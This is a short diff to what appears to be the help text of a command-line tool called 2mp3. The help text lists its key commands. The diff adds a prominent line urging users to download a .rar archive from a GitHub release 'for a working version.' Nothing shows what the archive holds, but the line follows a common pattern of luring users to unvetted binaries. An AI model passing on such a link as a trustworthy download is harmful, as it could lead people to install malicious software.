@@ -1,3 +1,7 @@
+PLEASE DOWNLOAD FROM https://github.com/EthanMeep/2mp3/releases/download/V1/2mp3_64.rar FOR A WORKING VERSION
+
+
+
 KEY INPUT COMMANDS:
 u - check for updates |   x - force update |   h - help information
 f - file input        |   p - edit proxy   |   enter - open downloads
